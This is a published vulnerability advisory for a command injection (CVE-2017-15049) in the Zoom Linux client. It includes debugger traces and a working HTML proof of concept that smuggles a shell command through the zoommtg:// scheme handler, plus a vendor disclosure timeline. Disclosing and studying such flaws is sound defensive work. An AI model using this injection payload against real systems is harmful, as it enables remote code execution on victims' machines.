@@ -1,0 +1,111 @@
+[CONVISO-17-003] - Zoom Linux Client Command Injection Vulnerability (RCE)
+
+1. Advisory Information
+    Conviso Advisory ID: CONVISO-17-003
+    CVE ID: CVE-2017-15049
+    CVSS v2: 10, (AV:N/AC:L/Au:N/C:C/I:C/A:C)
+    Date: 2017-10-01
+
+2. Affected Components
+    Zoom client for Linux, version 2.0.106600.0904 (zoom_amd64.deb). Other versions may be
+    vulnerable.
+
+3. Description
+    The binary /opt/zoom/ZoomLauncher is vulnerable to command injection because it uses user input
+    to construct a shell command without proper sanitization.
+    The client registers a scheme handler (zoommtg://) and this makes possible to trigger the
+    vulnerability remotely.
+
+4. Details
+    gef>  r '$(uname)'
+    Starting program: /opt/zoom/ZoomLauncher '$(uname)'
+    ZoomLauncher started.
+    cmd line: $(uname)
+    $HOME = /home/user
+
+    Breakpoint 5, 0x0000000000401e1f in startZoom(char*, char*) ()
+    gef>  x/3i $pc
+    => 0x401e1f <_Z9startZoomPcS_+744>:     call   0x4010f0 <strcat@plt>
+       0x401e24 <_Z9startZoomPcS_+749>:     lea    rax,[rbp-0x1420]
+       0x401e2b <_Z9startZoomPcS_+756>:     mov    rcx,0xffffffffffffffff
+    gef>  x/s $rdi
+    0x7fffffffbf10: "export SSB_HOME=/home/user/.zoom; export QSG_INFO=1; export
+    LD_LIBRARY_PATH=/opt/zoom;/opt/zoom/zoom \""
+    gef>  x/s $rsi
+    0x7fffffffd750: "$(uname) "
+    gef>  c
+    Continuing.
+    export SSB_HOME=/home/user/.zoom; export QSG_INFO=1; export
+    LD_LIBRARY_PATH=/opt/zoom;/opt/zoom/zoom "$(uname) "
+
+    Breakpoint 6, 0x0000000000401e82 in startZoom(char*, char*) ()
+    gef>  x/3i $pc
+    => 0x401e82 <_Z9startZoomPcS_+843>:     call   0x401040 <system@plt>
+       0x401e87 <_Z9startZoomPcS_+848>:     mov    DWORD PTR [rbp-0x18],eax
+       0x401e8a <_Z9startZoomPcS_+851>:     mov    eax,DWORD PTR [rbp-0x18]
+    gef>  x/s $rdi
+    0x7fffffffbf10: "export SSB_HOME=/home/user/.zoom; export QSG_INFO=1; export
+    LD_LIBRARY_PATH=/opt/zoom;/opt/zoom/zoom \"$(uname) \""
+
+    --- RCE POC ---
+    <html>
+        <head>
+        </head>
+        <body>
+            <h1>Zoom POC RCE</h1>
+            <script>
+                window.location = 'zoommtg://$(gnome-calculator${IFS}-e${IFS}1337)'
+            </script>
+        <body>
+    </html>
+
+5. Solution
+    Upgrade to latest version.
+
+6. Credits
+    Ricardo Silva <rsilva@conviso.com.br>
+    Gabriel Quadros <gquadros@conviso.com.br>
+
+7. Report Timeline
+    Set 28, 2017 - Conviso sent first email asking for a channel to discuss the vulnerability.
+    Set 28, 2017 - Vendor asked the report in the current channel.
+    Set 28, 2017 - Conviso sent informations to reproduce the vulnerability.
+    Set 28, 2017 - Conviso asked if they could reproduce it.
+    Set 28, 2017 - Vendor replied saying that the informations were forwarded to engineering team.
+    Oct  5, 2017 - Vendor provided a patch candidate for testing.
+    Oct  5, 2017 - Conviso pointed problems in the patch.
+    Oct 11, 2017 - Vendor provided a patch candidate for testing.
+    Oct 12, 2017 - Conviso pointed problems in the patch.
+    Oct 23, 2017 - Conviso asked for status.
+    Oct 27, 2017 - Conviso asked for status.
+    Nov  1, 2017 - Conviso asked for status.
+    Nov  3, 2017 - Vendor replied.
+    Nov  6, 2017 - Conviso asked for status.
+    Nov  6, 2017 - Vendor replied.
+    Nov  9, 2017 - Conviso asked for status.
+    Nov 13, 2017 - Conviso asked for status.
+    Nov 15, 2017 - Conviso asked for status.
+    Nov 16, 2017 - Vendor provided a patch candidate for testing.
+    Nov 16, 2017 - The patch seems to fix the attack vector, although no further research was done.
+    Nov 20, 2017 - Vendor thanked and marked the issue as solved, considering the patch as a
+    sastifactory fix.
+    Nov 30, 2017 - Vendor released the version 2.0.115900.1201
+
+8. References
+    https://zoom.us/download
+    https://support.zoom.us/hc/en-us/articles/205759689-New-Updates-for-Linux
+
+9. About Conviso
+    Conviso is a consulting company specialized on application security. Our values are based on the
+    allocation of the adequate competencies on the field, a clear and direct speech with the market,
+    collaboration and partnership with our customers and business partners and constant investments
+    on methodology and research improvement. For more information about our company and services
+    provided, please check our website at www.conviso.com.br.
+
+10. Copyright and Disclaimer
+    The information in this advisory is Copyright 2017 Conviso Application Security S/A and provided
+    so that the society can understand the risk they may be facing by running affected software,
+    hardware or other components used on their systems. In case you wish to copy information from
+    this advisory, you must either copy all of it or refer to this document (including our URL). No
+    guarantee is provided for the accuracy of this information, or damage you may cause your systems
+    in testing.
